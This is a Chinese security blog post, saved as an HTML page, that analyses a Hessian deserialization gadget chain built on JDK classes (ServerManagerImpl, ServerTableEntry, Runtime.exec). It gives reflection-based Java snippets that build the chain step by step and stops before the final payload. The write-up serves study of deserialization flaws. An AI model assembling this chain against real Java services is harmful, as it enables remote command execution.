@@ -1,0 +1,817 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    JAVA反序列化-Hessian反序列化JDK原生新链 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="总结：这些链好用是好用，也挺好理解，就是难找，有些类我都不知道拿来干嘛的  参考 从2025blackhat-jdd hessian反序列化jdk原生新链开始学习链子构造-先知社区 Black2025-JDD Hessian反序列化链-先知社区 依赖： 123456&lt;!-- hessian --&gt;  &lt;dependency&gt;      &lt;groupId&gt;com.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA反序列化-Hessian反序列化JDK原生新链">
+<meta property="og:url" content="http://example.com/2025/12/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96JDK%E5%8E%9F%E7%94%9F%E6%96%B0%E9%93%BE/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="总结：这些链好用是好用，也挺好理解，就是难找，有些类我都不知道拿来干嘛的  参考 从2025blackhat-jdd hessian反序列化jdk原生新链开始学习链子构造-先知社区 Black2025-JDD Hessian反序列化链-先知社区 依赖： 123456&lt;!-- hessian --&gt;  &lt;dependency&gt;      &lt;groupId&gt;com.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226001701373.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226001714328.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226001726243.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226001740340.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226002411793.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226002442422.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226002513485.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226002703827.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226003133586.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226004533299.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226004734738.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226004815249.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226005055216.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226010018123.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226010107355.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226011252107.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226014138233.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226014449868.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226015042980.png">
+<meta property="og:image" content="http://example.com/2025/12/25/images/image-20251226020008482.png">
+<meta property="article:published_time" content="2025-12-25T15:25:41.000Z">
+<meta property="article:modified_time" content="2025-12-25T18:18:55.112Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="JAVA反序列化">
+<meta property="article:tag" content="Hessian反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/12/25/images/image-20251226001701373.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="JAVA反序列化-Hessian反序列化JDK原生新链">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">JAVA反序列化-Hessian反序列化JDK原生新链</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.</span> <span class="toc-text"> 参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> hessian2反序列化流程简单分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sink%E7%82%B9getter%E8%A7%A6%E5%8F%91runtime"><span class="toc-number">3.</span> <span class="toc-text"> sink点–getter触发Runtime</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text"> 构造分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E5%AD%90%E6%9E%84%E9%80%A0"><span class="toc-number">3.2.</span> <span class="toc-text"> 链子构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#servermanagerimplgetactiveservers-servertableentryisvalid"><span class="toc-number">3.2.1.</span> <span class="toc-text"> ServerManagerImpl#getActiveServers-&gt;ServerTableEntry#isValid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#servertableentryisvalid-servertableentryactivate"><span class="toc-number">3.2.2.</span> <span class="toc-text"> ServerTableEntry#isValid-&gt;ServerTableEntry#activate</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#servertableentryactivate-runtimeexec"><span class="toc-number">3.2.3.</span> <span class="toc-text"> ServerTableEntry#activate-&gt;Runtime#exec</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#final"><span class="toc-number">3.3.</span> <span class="toc-text"> Final</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E6%88%96jackson%E8%A7%A6%E5%8F%91getter"><span class="toc-number">4.</span> <span class="toc-text"> fastJson或Jackson触发getter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jackson"><span class="toc-number">4.1.</span> <span class="toc-text"> Jackson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson"><span class="toc-number">4.2.</span> <span class="toc-text"> fastJson</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91tostring"><span class="toc-number">5.</span> <span class="toc-text"> 触发toString</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashmap-audiofileformat-tostring"><span class="toc-number">5.1.</span> <span class="toc-text"> HashMap-&gt;AudioFileFormat-&gt;toString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#concurrenthashmap-audiofileformat-tostring"><span class="toc-number">5.2.</span> <span class="toc-text"> ConcurrentHashMap-&gt;AudioFileFormat-&gt;toString</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#audioformat"><span class="toc-number">5.2.1.</span> <span class="toc-text"> AudioFormat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xtring"><span class="toc-number">5.2.2.</span> <span class="toc-text"> Xtring</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xstringforchars"><span class="toc-number">5.2.3.</span> <span class="toc-text"> XStringForChars</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hashmap-xstringforfsb-tostring"><span class="toc-number">5.3.</span> <span class="toc-text"> HashMap-&gt;XStringForFSB-&gt;toString</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-JAVA反序列化-Hessian反序列化JDK原生新链" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/12/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96JDK%E5%8E%9F%E7%94%9F%E6%96%B0%E9%93%BE/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-12-25T15:25:41.000Z" itemprop="datePublished">2025-12-25</time>
+    <time style="display: none;" id="post-update-time">2025-12-26</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>总结：这些链好用是好用，也挺好理解，就是难找，有些类我都不知道拿来干嘛的</p>
+<h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18935">从2025blackhat-jdd hessian反序列化jdk原生新链开始学习链子构造-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/19119">Black2025-JDD Hessian反序列化链-先知社区</a></p>
+<p>依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hessian --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="hessian2反序列化流程简单分析"><a class="markdownIt-Anchor" href="#hessian2反序列化流程简单分析"></a> hessian2反序列化流程简单分析</h2>
+<p>以防忘记了，再来理一遍，这里直接扒大佬的（我是躺赢狗）</p>
+<p><strong>拿Map类型的类来进行序列化</strong>，因为hessian2只有在tag为72，也就是第一个反序列化的类为Map类型时才会走到<code>MapDeserializer#readMap</code>从而触发<code>map.put</code>方法。</p>
+<p><img src="../images/image-20251226001701373.png" alt="image-20251226001701373" /></p>
+<p>可以发现，读取到的第一个字节tag为72，也就是Map类型的类，跟到case中。</p>
+<p><img src="../images/image-20251226001714328.png" alt="image-20251226001714328" /></p>
+<p>72的case就实现了一个方法，也就是readMap方法，步入。</p>
+<p><img src="../images/image-20251226001726243.png" alt="image-20251226001726243" /></p>
+<p>这里会新建一个<code>MapDeserializer</code>，默认反序列化成 <code>HashMap</code>，并调用readMap。</p>
+<p><img src="../images/image-20251226001740340.png" alt="image-20251226001740340" /></p>
+<p>这里会将序列化数据反序列化为一个map类，并且其中调用了map.put进行赋值操作，正是map.put这个方法导致了后续的反序列化问题。</p>
+<p>具体细节可以参考这个佬写的文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17603">https://xz.aliyun.com/news/17603</a></p>
+<h2 id="sink点getter触发runtime"><a class="markdownIt-Anchor" href="#sink点getter触发runtime"></a> sink点–getter触发Runtime</h2>
+<h3 id="构造分析"><a class="markdownIt-Anchor" href="#构造分析"></a> 构造分析</h3>
+<p>这里的思路是触发<code>ServerManagerImpl</code>的<code>getter</code>方法，从而触发内部的<code>runtime.exec</code></p>
+<p>首先看到首先是<code>ServerManagerImpl#getActiveServers</code>方法</p>
+<p><img src="../images/image-20251226002411793.png" alt="image-20251226002411793" /></p>
+<p>然后进入<code>entry.isValid</code>方法，也就是<code>ServerTableEntry#isValid</code></p>
+<p><img src="../images/image-20251226002442422.png" alt="image-20251226002442422" /></p>
+<p>跟进activate()方法：</p>
+<p><img src="../images/image-20251226002513485.png" alt="image-20251226002513485" /></p>
+<p>可以发现<code>activate</code>方法里面是自带<code>Runtime.getRuntime().exec</code>的。</p>
+<p><img src="../images/image-20251226002703827.png" alt="image-20251226002703827" /></p>
+<h3 id="链子构造"><a class="markdownIt-Anchor" href="#链子构造"></a> 链子构造</h3>
+<h4 id="servermanagerimplgetactiveservers-servertableentryisvalid"><a class="markdownIt-Anchor" href="#servermanagerimplgetactiveservers-servertableentryisvalid"></a> <code>ServerManagerImpl#getActiveServers-&gt;ServerTableEntry#isValid</code></h4>
+<p>首先，先把我们需要的<code>ServerManagerImpl</code>类构造出来，由于<code>ServerManagerImpl</code>的构造函数不为public，因此这里使用反射的方法来进行构造。</p>
+<p><img src="../images/image-20251226003133586.png" alt="image-20251226003133586" /></p>
+<p>代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射创建ServerManagerImpl的实例</span></span><br><span class="line"><span class="type">ServerManagerImpl</span> <span class="variable">serverManager</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerManagerImpl.class);</span><br><span class="line">serverManager.getActiveServers();</span><br></pre></td></tr></table></figure>
+<p>我们debug一下，看能不能到getActiveServers()方法</p>
+<p><img src="../images/image-20251226004533299.png" alt="image-20251226004533299" /></p>
+<p>可以看到这里已经走到了这个方法，但由于serverTable为null，因此再走就会报错</p>
+<p><img src="../images/image-20251226004734738.png" alt="image-20251226004734738" /></p>
+<p><img src="../images/image-20251226004815249.png" alt="image-20251226004815249" /></p>
+<p>因此现在就需要给serverTable赋值，而serverTable是一个HashMap</p>
+<p><img src="../images/image-20251226005055216.png" alt="image-20251226005055216" /></p>
+<p>因此构造为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerManagerImpl</span> <span class="variable">serverManager</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerManagerImpl.class);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">setFieldValue(serverManager, <span class="string">&quot;serverTable&quot;</span>, map);</span><br><span class="line">serverManager.getActiveServers();</span><br></pre></td></tr></table></figure>
+<p>现在debug代码可以走到try里了，但是由于<code>HashMap</code>里面没有给值，所以不会进入<code>while</code>循环中，详细看一下这段代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (serverList.hasNext()) &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> (Integer) serverList.next();</span><br><span class="line">        <span class="comment">// get an entry</span></span><br><span class="line">        entry = (ServerTableEntry) serverTable.get(key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (entry.isValid() &amp;&amp; entry.isActive()) &#123;</span><br><span class="line">            servers.add(entry);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里起主要作用的就是<code>entry</code>参数，而<code>entry</code>是一个<code>ServerTableEntry</code>，并且应该是<code>key</code>所对应的<code>value</code>，根据这些我们给<code>map</code>进行赋值</p>
+<p><code>ServerTableEntry</code>的构造函数同样不是<code>public1</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerManagerImpl</span> <span class="variable">serverManager</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerManagerImpl.class);</span><br><span class="line"><span class="type">ServerTableEntry</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerTableEntry.class);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="number">1</span>,serverTableEntry);</span><br><span class="line"></span><br><span class="line">setFieldValue(serverManager, <span class="string">&quot;serverTable&quot;</span>, map);</span><br><span class="line">serverManager.getActiveServers();</span><br></pre></td></tr></table></figure>
+<p>现在已经可以进入<code>isValid</code>方法了。</p>
+<h4 id="servertableentryisvalid-servertableentryactivate"><a class="markdownIt-Anchor" href="#servertableentryisvalid-servertableentryactivate"></a> <code>ServerTableEntry#isValid-&gt;ServerTableEntry#activate</code></h4>
+<p>debug进去后也会因为<code>process=null</code>而报出异常。</p>
+<p><img src="../images/image-20251226010018123.png" alt="image-20251226010018123" /></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((state == ACTIVATING) || (state == HELD_DOWN)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            printDebug( <span class="string">&quot;isValid&quot;</span>, <span class="string">&quot;returns true&quot;</span> ) ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">exitVal</span> <span class="operator">=</span> process.exitValue();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalThreadStateException e1) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (state == ACTIVATED) &#123;</span><br><span class="line">        <span class="keyword">if</span> (activateRetryCount &lt; ActivationRetryMax) &#123;</span><br><span class="line">            <span class="keyword">if</span> (debug)</span><br><span class="line">                printDebug(<span class="string">&quot;isValid&quot;</span>, <span class="string">&quot;reactivating server&quot;</span>);</span><br><span class="line">            activateRetryCount++;</span><br><span class="line">            activate();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            printDebug(<span class="string">&quot;isValid&quot;</span>, <span class="string">&quot;holding server down&quot;</span>);</span><br><span class="line"></span><br><span class="line">        holdDown();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    deActivate();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现这里不止要传<code>process</code>，还需要<code>state=ACTIVATED</code>才能走到<code>activate</code></p>
+<p>这里<code>ACTIVATED</code>的值为2</p>
+<p><img src="../images/image-20251226010107355.png" alt="image-20251226010107355" /></p>
+<p>构造为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerManagerImpl</span> <span class="variable">serverManager</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerManagerImpl.class);</span><br><span class="line"><span class="type">ServerTableEntry</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span>createWithObjectNoArgsConstructor(ServerTableEntry.class);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="number">1</span>,serverTableEntry);</span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;exit&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">setFieldValue(serverManager, <span class="string">&quot;serverTable&quot;</span>, map);</span><br><span class="line">setFieldValue(serverTableEntry, <span class="string">&quot;process&quot;</span>, process);</span><br><span class="line">setFieldValue(serverTableEntry,<span class="string">&quot;state&quot;</span>,<span class="number">2</span>);</span><br><span class="line">serverManager.getActiveServers();</span><br></pre></td></tr></table></figure>
+<h4 id="servertableentryactivate-runtimeexec"><a class="markdownIt-Anchor" href="#servertableentryactivate-runtimeexec"></a> <code>ServerTableEntry#activate-&gt;Runtime#exec</code></h4>
